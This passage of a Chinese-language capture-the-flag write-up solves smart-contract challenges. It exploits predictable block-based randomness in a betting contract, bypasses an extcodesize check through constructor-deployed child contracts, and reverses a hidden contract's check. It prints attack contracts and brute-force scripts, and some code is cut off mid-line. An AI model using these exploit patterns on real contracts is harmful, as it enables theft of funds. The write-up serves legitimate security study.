    .text:000000000040082B                 retn
可以看出如果还爆破过程中，即在进行内层循环时，每次循环tnt包应该记录两个跳转：内层for判断和爆破成功判断。而如果爆破成功，会记录3次跳转后转到下一字节的爆破中（内层for跳转为真，爆破成功跳转为真，外层for跳转为真），因此可以直接提取这块数据写脚本跑
    flow = ""
    f = open("flow.txt","r")
    while True:
        tmp = f.readline()
        if tmp != "":
            flow += tmp.rstrip()
        else:
            break
    flow = flow[1:]
    length = len(flow)
    i = 0
    j = ord(' ')
    res = []
    while i  uint256) public bet_count;
        uint256 FUND = 100;
        uint256 MOD_NUM = 20;
        uint256 POWER = 100;
        uint256 SMALL_CHIP = 1;
        uint256 BIG_CHIP = 20;
        EOSToken  eos;
        event FLAG(string b64email, string slogan);
        constructor() public{
            eos=new EOSToken();
        }
        function initFund() public{
            if(bet_count[tx.origin] == 0){
                bet_count[tx.origin] = 1;
                eos.mint(tx.origin, FUND);
            }
        }
        function bet(uint256 chip) internal {
            bet_count[tx.origin] = bet_count[tx.origin].add(1);
            uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
            uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
            uint256 shark = seed_hash % MOD_NUM;
            uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));
            uint256 lucky = lucky_hash % MOD_NUM;
            if (shark == lucky){
                eos.transfer(address(this), tx.origin, chip.mul(POWER));
            }
        }
        function smallBlind() public {
            eos.transfer(tx.origin, address(this), SMALL_CHIP);
            bet(SMALL_CHIP);
        }
        function bigBlind() public {
            eos.transfer(tx.origin, address(this), BIG_CHIP);
            bet(BIG_CHIP);
        }
        function eosBlanceOf() public view returns(uint256) {
            return eos.eosOf(tx.origin);
        }
        function CaptureTheFlag(string b64email) public{
            require (eos.eosOf(tx.origin) > 18888);
            emit FLAG(b64email, "Congratulations to capture the flag!");
        }
    }
一个简单的赌博游戏，显然这里的随机数是可预测的，因为取的仅仅是区块号与时间戳，而用户方面则是取了bet的次数作为输入，同时注意到里面还有`smallBlind`和`bigBlind`来提供不同的下注额度，small仅需1
token，而big则需要20
token，猜对的奖励则是赌注的100倍，看到这里我的想法就是拿`smallBlind`来更新我们的`bet_count`，当`bet_count`满足需求时再使用`bigBlind`，写一个简单的攻击合约
    contract attack {
        EOSGame target = EOSGame(0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F);
        function pwn() public {
            for (uint i=target.bet_count(your account)+1;i uint256)  public balance;
        uint public totalSupply  = 10**18;
        WinnerList wlist;
        event FLAG(string b64email, string slogan);
        constructor(address _addr) public{
            wlist = WinnerList(_addr);
        }
        modifier turingTest() {
                address _addr = msg.sender;
                uint256 _codeLength;
                assembly {_codeLength := extcodesize(_addr)}
                require(_codeLength == 0, "sorry humans only");
                _;
        }
        function transfer(address _to, uint256 _amount) public{
            require(balance[msg.sender] >= _amount);
            balance[msg.sender] = balance[msg.sender].sub(_amount);
            balance[_to] = balance[_to].add(_amount);
        }
        function airDrop() public turingTest returns (bool) {
            uint256 seed = uint256(keccak256(abi.encodePacked(
                (block.timestamp).add
                (block.difficulty).add
                ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
                (block.gaslimit).add
                ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add
                (block.number)
            )));
            if((seed - ((seed / 1000) * 1000))  8888);
            wlist.note(msg.sender,balance[msg.sender]);
            emit FLAG(b64email, "Congratulations to capture the flag?");
        }
    }
看样子似乎又是一个随机数预测，其中的`turingTest`可使用合约的构造函数绕过，至于下面的空投函数，我们可以看到只有其中的`msg.sender`是我们可控的，其他的都是区块信息，也就是说每个发送者在每个区块中能否中奖是确定的。
有意思的是seed中使用的是`msg.sender`，到了下面的奖励发放又用的是`tx.origin`，这样的话我们就可以通过合约部署子合约的方式来在一个区块里扩展`msg.sender`，至于`seed`的判断，本来我是想在子合约里判断一下，不过后来发现哪怕没有中奖也没任何损失，那么直接无脑发交易就行了，部署攻击合约
    contract pwn {
        constructor() {
            Fake3D target =Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);
            target.airDrop();
        }
    }
    contract attack {
        function exp() public {
            for (uint i=0;i wlist.note(msg.sender,balance[msg.sender]);
如果按照源码里显示的来看，此处仅仅是使用一个结构体保存了一下获胜者的地址跟余额信息，虽然初始化结构体的方式有点问题，会造成变量覆盖，但是对后面的执行应该是没有影响的，那么显然源码肯定是有问题的
要注意的是这里的wlist合约跟fake3d合约是没有任何联系的，比如继承之类的，这样在进行发布源码进行字节码检查的时候其实只要合约的abi对的上就行了，也就是说wlist合约里确实有个`note`函数，但内容跟源码中完全不同
从storage中读取到wlist合约的地址
    >web3.eth.getStorageAt('0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a', 2, console.log); 
    "0x000000000000000000000000d229628fd201a391cf0c4ae6169133c1ed93d00a"
拿到该地址合约的字节码，我们不妨自己部署个wlist合约比对一下，发现字节码确实不一样，这里就需要对合约进行逆向了
反编译后的伪代码:
    contract Contract {
        function main() {
            memory[0x40:0x60] = 0x80;
            if(msg.data.length = 0x14) { assert(); }
            var temp0 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 & ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;
            var1 = temp0;
            if(!var1) {
            label_023F:
                if(!var1) { return; }
                else { revert(memory[0x00:0x00]); }
            } else {
                var1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff & 0x0100000000000000000000000000000000000000000000000000000000000000 * 0x43;
                var2 = tx.origin * 0x01000000000000000000000000;
                var3 = 0x13;
                if(var3 >= 0x14) { assert(); }
                var1 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 & ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;
                goto label_023F;
            }
        }
    }
刚开始是奔着还原所有逻辑再想办法做题去的，但是为了拿一血还是走了点捷径。题目合约里的`wlist.note(msg.sender,balance[msg.sender]);`这个语句没有一点用，除了让交易revert，提flag不成功。所以逆向的时候只要找准`revert(memory[0x00:0x00]);`然后绕过,或者找准`return`然后进入就修行。
核心点在
    var temp0 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 & ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;
这里让`temp0`为`0`后面就return了。注意反编译出来的`byte()`的2个参数是反的。
总结一下就是要求`tx.origin`的第0x12个字节(从0开始数)为`b1`
这就意味着`note`函数中还有一个判断，要求`tx.origin`地址的倒数第二个字节为b1，那么赶紧爆一个地址出来，写了个简单的脚本
    const generate = require('ethjs-account').generate;
    seed='892h@fs8sk^2hSFR*/8s8shfs.jk39hsoi@hohskd51D1Q8E1%^;DZ1-=.@WWRXNI()VF6/*Z%$C51D1QV*<>FE8RG!FI;"./+-*!DQ39hsoi@hoFE1F5^7E%&*QS'//生成地址所用的种子
    function fuzz() {
        for(var k=0;k<5000;k++){
            seed=seed+Math.random().toString(36).substring(12);//更新种子
            for (var i=0;i<2000;i++){
                res=generate(seed);
                if(res.address.slice(38,40)=='b1'){
                    console.log(res);
                    return;
                }
            }
        }